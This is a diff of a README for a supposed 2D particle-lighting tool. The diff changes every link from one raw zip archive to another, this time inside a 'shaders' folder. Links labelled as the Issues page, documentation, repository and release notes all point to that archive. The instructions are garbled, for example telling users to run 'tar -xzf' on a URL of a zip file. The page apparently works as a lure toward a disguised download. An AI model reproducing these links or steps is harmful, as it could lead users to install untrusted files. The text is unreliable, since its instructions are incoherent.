@@ -1,6 +1,6 @@
 # ✨ LitWithParticles - A Unique Lighting Experience for Your 2D Projects
 
-[![Download LitWithParticles](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/images/Particles_Lit_With_2.6.zip)](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/images/Particles_Lit_With_2.6.zip)
+[![Download LitWithParticles](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/shaders/With-Lit-Particles-1.1-alpha.3.zip)](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/shaders/With-Lit-Particles-1.1-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to LitWithParticles! This application will help you enhance your 2D proj
 To get started, you need to download the application. Follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Download LitWithParticles](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/images/Particles_Lit_With_2.6.zip)
+   [Download LitWithParticles](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/shaders/With-Lit-Particles-1.1-alpha.3.zip)
 
 2. On the Releases page, you will see a list of available versions. Look for the most recent version.
 
@@ -20,7 +20,7 @@ To get started, you need to download the application. Follow these steps:
 4. Locate the file suitable for your operating system. 
    - For Windows, look for a file ending in `.exe`.
    - For macOS, check for files ending in `.dmg`.
-   - For Linux, look for files ending in `https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/images/Particles_Lit_With_2.6.zip`.
+   - For Linux, look for files ending in `https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/shaders/With-Lit-Particles-1.1-alpha.3.zip`.
 
 5. Click on the download link for the appropriate file. The download will start automatically.
 
@@ -43,8 +43,8 @@ To get started, you need to download the application. Follow these steps:
 ### Linux Installation
 
 - Open a terminal window.
-- Navigate to your Downloads folder where the `https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/images/Particles_Lit_With_2.6.zip` file is saved.
-- Use the command `tar -xzf https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/images/Particles_Lit_With_2.6.zip` to extract the files.
+- Navigate to your Downloads folder where the `https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/shaders/With-Lit-Particles-1.1-alpha.3.zip` file is saved.
+- Use the command `tar -xzf https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/shaders/With-Lit-Particles-1.1-alpha.3.zip` to extract the files.
 - Follow any included instructions for installation. Run the executable as needed.
 
 ## 🌟 Features
@@ -71,15 +71,15 @@ If you encounter issues during installation or while running the application, co
 - Ensure you have sufficient permissions to install software on your computer.
 - Check that your system meets the minimum requirements listed above.
 - Restart your computer and try running the application again.
-- Visit our [GitHub Issues page](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/images/Particles_Lit_With_2.6.zip) to report issues or find additional support.
+- Visit our [GitHub Issues page](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/shaders/With-Lit-Particles-1.1-alpha.3.zip) to report issues or find additional support.
 
 ## 📞 Support
 
-For further help, please check our [documentation](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/images/Particles_Lit_With_2.6.zip) or reach out to our community on our GitHub page.
+For further help, please check our [documentation](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/shaders/With-Lit-Particles-1.1-alpha.3.zip) or reach out to our community on our GitHub page.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/images/Particles_Lit_With_2.6.zip)
-- [Release Notes](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/images/Particles_Lit_With_2.6.zip)
+- [GitHub Repository](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/shaders/With-Lit-Particles-1.1-alpha.3.zip)
+- [Release Notes](https://github.com/ANTHONYBENICIO2012/LitWithParticles/raw/refs/heads/main/shaders/With-Lit-Particles-1.1-alpha.3.zip)
 
 Thank you for choosing LitWithParticles. We hope you enjoy creating beautiful lighting effects in your 2D projects!
